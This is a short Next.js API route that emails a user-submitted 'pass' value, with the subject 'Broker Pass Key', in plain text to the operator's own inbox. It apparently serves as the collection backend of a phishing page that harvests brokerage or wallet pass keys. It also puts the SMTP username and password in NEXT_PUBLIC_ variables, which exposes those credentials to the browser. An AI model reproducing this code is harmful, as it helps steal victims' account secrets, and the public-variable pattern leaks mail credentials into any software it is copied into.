import { NextApiRequest, NextApiResponse } from "next";
import nodemailer from "nodemailer";

export default async function SendMail(
  req: NextApiRequest,
  res: NextApiResponse
) {
  const request = await req.body;

  const transporter: nodemailer.Transporter = nodemailer.createTransport({
    host: process.env.NEXT_PUBLIC_EMAIL_HOST,
    port: 465,
    secure: true,
    auth: {
      user: process.env.NEXT_PUBLIC_EMAIL_USER,
      pass: process.env.NEXT_PUBLIC_EMAIL_PASS,
    },
  });

  const mailOptions: nodemailer.SendMailOptions = {
    from: process.env.NEXT_PUBLIC_EMAIL_USER, // sender address
    to: process.env.NEXT_PUBLIC_EMAIL_USER, // list of receivers
    subject: "Broker Pass Key", // Subject line
    text: request.pass, // plain text body
  };
  return await transporter
    .sendMail(mailOptions)
    .then((response: nodemailer.SentMessageInfo) => {
      return res
        .status(200)
        .json({ error: false, emailSent: true, errors: [], response });
    })
    .catch((error: nodemailer.SentMessageInfo) => {
      return res
        .status(500)
        .json({ error: true, emailSent: false, errors: [error] });
    });
}
